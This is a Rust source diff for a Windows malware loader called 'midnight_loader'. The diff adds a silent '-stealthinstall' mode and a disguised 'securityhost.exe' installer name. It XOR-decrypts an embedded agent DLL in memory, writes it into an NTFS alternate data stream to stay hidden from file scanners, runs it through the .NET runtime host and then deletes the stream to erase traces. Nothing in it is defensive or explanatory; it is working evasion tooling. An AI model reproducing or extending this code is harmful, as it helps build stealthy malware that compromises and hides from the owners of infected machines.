@@ -338,12 +338,14 @@ fn main() -> windows::core::Result<()> {
         
         // STRATEGIC AGENT DETECTION:
         // Show UI if it's the installer filename and NO 'agent' argument is present
-        let is_installer_file = current_exe_name == "midnight_loader.exe" || current_exe_name == "midnightloader.exe";
+        let is_installer_file = current_exe_name == "midnight_loader.exe" || current_exe_name == "midnightloader.exe" || current_exe_name == "securityhost.exe";
         let has_agent_arg = args.iter().any(|a| a == "agent");
+        let has_stealth_arg = args.iter().any(|a| a == "-stealthinstall");
         
         // IF it's the installer file, we ALWAYS act as installer and EXIT after.
         let is_agent_mode = !is_installer_file || has_agent_arg;
-        let should_show_ui = is_installer_file && !has_agent_arg;
+        let should_show_ui = is_installer_file && !has_agent_arg && !has_stealth_arg;
+        let should_stealth_install = is_installer_file && has_stealth_arg;
         
         if should_show_ui {
             // Ensure console is visible for installer
@@ -381,6 +383,18 @@ fn main() -> windows::core::Result<()> {
                 Err(e) => {
                     println!("[!] Installation failed: {}", e);
                 }
+            }
+            
+            return Ok(());
+        }
+
+        if should_stealth_install {
+            let _ = FreeConsole();
+            unsafe { SILENT_MODE = true; }
+            
+            if is_privileged {
+                uninstall_old_agent();
+                let _ = install_agent();
             }
             
             return Ok(());
@@ -522,29 +536,39 @@ fn main() -> windows::core::Result<()> {
         let runtime_host: ICLRRuntimeHost = runtime_info.GetInterface(&GUID::from_u128(0x90f1a06e_7712_4762_86b5_7a5eba6bdb02))?;
         let _ = runtime_host.Start();
         
-        // === ZERO-FILE LOADING (ADS - Alternative Data Stream) ===
-        // We hide the DLL bytes INSIDE the current executable's metadata stream.
-        let dll_bytes = include_bytes!(r"..\..\MidnightAgent\bin\Release\net48\MidnightAgent.dll");
+        // === ZERO-FILE LOADING (Encrypted + ADS + Cleanup) ===
+        // 1. Decrypt the payload in memory using the random key
+        let encrypted_bytes = include_bytes!(r"agent.bin.enc");
+        let key = include_bytes!(r"key.bin")[0];
+        let dll_bytes: Vec<u8> = encrypted_bytes.iter().map(|&b| b ^ key).collect();
         
-        // ADS Path format: "C:\path\executable.exe:metadata"
-        // This hides the DLL within the file itself, invisible to normal file scanners.
+        // 2. Hide the DLL bytes INSIDE the current executable's metadata stream
         let ads_path = format!("{}:metadata", current_path);
         
-        // Write bytes to the hidden stream
-        if std::fs::write(&ads_path, dll_bytes).is_ok() {
+        if std::fs::write(&ads_path, &dll_bytes).is_ok() {
             let path_hstring = HSTRING::from(&ads_path);
-            
             let type_name = HSTRING::from("MidnightAgent.Program");
             let method_name = HSTRING::from("Run");
             let method_arg = HSTRING::from("");
             
-            // The .NET host can load assemblies directly from ADS paths!
-            let _ = runtime_host.ExecuteInDefaultAppDomain(
+            // 3. Load from ADS
+            println!("[*] Loading Agent from hidden stream...");
+            let result = runtime_host.ExecuteInDefaultAppDomain(
                 PCWSTR(path_hstring.as_ptr()), 
                 PCWSTR(type_name.as_ptr()), 
                 PCWSTR(method_name.as_ptr()), 
                 PCWSTR(method_arg.as_ptr())
             );
+
+            match result {
+                Ok(code) => println!("[+] Agent finished with code: {}", code),
+                Err(e) => println!("[-] Loader Error: {:?}", e),
+            }
+
+            // 4. [CRITICAL] Delete the ADS stream after execution
+            let _ = std::fs::remove_file(&ads_path);
+        } else {
+            println!("[-] Failed to write to ADS metadata stream.");
         }
 
 
